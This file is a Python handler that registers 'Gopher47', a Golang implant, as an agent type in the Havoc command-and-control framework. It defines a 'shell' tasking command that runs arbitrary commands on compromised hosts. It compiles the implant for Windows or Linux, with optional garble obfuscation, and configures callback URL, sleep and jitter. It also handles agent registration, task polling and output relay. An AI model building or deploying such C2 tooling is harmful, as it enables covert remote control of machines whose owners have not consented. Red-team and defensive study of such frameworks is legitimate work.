from havoc.service import HavocService
from havoc.agent import *
from os.path import join
from os import system
import re

# ====================
# BEGIN COMMANDS
# ====================
class CommandShell(Command):
    Name = "shell"
    Description = "executes commands"
    Help = "Ex: shell whoami"
    NeedAdmin = False
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_data("shell " + arguments['commands'])
        return Task.buffer

class CommandExit(Command):
    Name        = "o7"
    Description = "just tells the agent to exit"
    Help        = "literally read the description"
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_data("o7")
        return Task.buffer

# ====================
# BEGIN AGENT
# ====================
class Gopher47(AgentType):
    Name = "Gopher47"
    Author = "@An00bRektn"
    Version = "0.1"
    Description = f"""Golang 3rd party agent for Havoc, version {Version}"""
    MagicValue = 0x63616665

    Arch = [
        "x64"
    ]

    Formats = [
        {
            "Name": "Windows Executable",
            "Extension": "exe"
        },
        {
            "Name": "ELF",
            "Extension": ""
        },
    ]

    BuildingConfig = {
        "Sleep": "10",
        "JitterRange": "100",
        "Use Garble?": False
    }

    Commands = [
        CommandShell(),
        CommandExit(),
    ]

    # Stolen from https://github.com/susMdT/SharpAgent/blob/main/handler.py
    def generate( self, config: dict ) -> None:
        #print(config)
        # builder_send_message. this function send logs/messages to the payload build for verbose information or sending errors (if something went wrong).
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )

        try:
            # NOTE: Although this says "urls", it will only handle one URL for connection as of right now
            # Getting URL for agent
            urls = []
            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent secure: {config['Options']['Listener'].get('Secure')}" )
            if config['Options']['Listener'].get("Secure") == False:
                urlBase = "http://"+config['Options']['Listener'].get("Hosts")[0]+":"+config['Options']['Listener'].get("Port")
            else:
                urlBase = "https://"+config['Options']['Listener'].get("Hosts")[0]+":"+config['Options']['Listener'].get("Port")

            for endpoint in config['Options']['Listener'].get("Uris"):
                if endpoint[0] != '/': #check if the uri starts with /
                    urls.append(urlBase+'/'+endpoint)
                else:
                    urls.append(urlBase+endpoint)
            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent URLs: {urls}" )

            # Sleep is in seconds
            print(config['Config'])
            sleep = int(config['Config'].get('Sleep'))
            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Sleep: {sleep}" )

            # Jitter is in milliseconds
            jitter = int(config['Config'].get('JitterRange'))
            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Jitter: {jitter}" )

            old_strings = [
                "Url:",
                "SleepTime:",
                "JitterRange:"
            ]

            new_strings = [
                f'Url: "{urls[0]}"',
                f'SleepTime: {sleep}',
                f'JitterRange: {jitter}'
            ]
            # You better be running this from the project directory >:(
            conf = join("pkg", "utils")
            with open(join(conf, "config.go"), 'r') as fd:
                s = fd.read()

            with open(join(conf, "config.go"), 'w') as fd:
                for i in range(len(old_strings)):
                    print(f'Changing [{old_strings[i]}] to [{new_strings[i]}] in {join(conf, "config.go")}')
                    s = (re.sub(fr"{old_strings[i]}.*;", new_strings[i], s))
                fd.write(s)

            # TODO: Find a better way to do this, this looks scuffed and bad and ugly
            compile_cmd = "go"
            os_target = "linux"
            ext = ""
            if config["Config"].get('Use Garble?'):
                compile_cmd = "garble"

            if config["Options"].get('Format') == "Windows Executable":
                os_target = "windows"
                ext = ".exe"

            system(f"GOOS={os_target} GOARCH=amd64 {compile_cmd} build -o bin/gopher47{ext}")
            
            with open(join("bin", "gopher47"), 'rb') as fd:
                dat = fd.read()
                self.builder_send_payload(config["ClientID"], self.Name, dat)

        except Exception as e:
            import traceback
            self.builder_send_message( config[ 'ClientID' ], "Error", f"There was a build error: {traceback.format_exc()}" )
            self.builder_send_payload( config[ 'ClientID' ], "cancel this pls", b'probably your fault tbh' )
    
    def response(self, response: dict) -> bytes:
        agent_header    = response[ "AgentHeader" ]
        print("[+] Receieved request from agent: ", end='')
        agent_response  = base64.b64decode(response["Response"]) # the teamserver base64 encodes the request.
        print(agent_response.decode())
        agentjson = json.loads(agent_response, strict=False)
        if agentjson["task"] == "register":
            print("[*] Registered agent")
            self.register(agent_header, agentjson["data"])
            AgentID = response["AgentHeader" ]["AgentID"]
            self.console_message(AgentID, "Good", f"Gopher47 agent {AgentID} registered", "")
            return b'registered'
        elif agentjson["task"] == "gettask":
            AgentID = response[ "Agent" ][ "NameID" ]
            print("[*] Agent requested taskings")
            Tasks = self.get_task_queue(response["Agent"])
            print("[*] Tasks recieved")
            return Tasks
        elif agentjson["task"] == "commandoutput":
            AgentID = response["Agent"]["NameID"]
            if len(agentjson["data"]) > 0:
                self.console_message( AgentID, "Good", "Received Output:", agentjson["data"] )
        
        return b''

def main():
    Havoc_Gopher = Gopher47()
    print("[*] Connecting to the Havoc service API...")
    Havoc_Service = HavocService(
        endpoint="ws://localhost:40056/service-endpoint",
        password="service-password"
    )
    print("[+] Connected!")
    print("[*] Registering Gopher to Havoc...")
    Havoc_Service.register_agent(Havoc_Gopher)
    return

if __name__ == "__main__":
    main()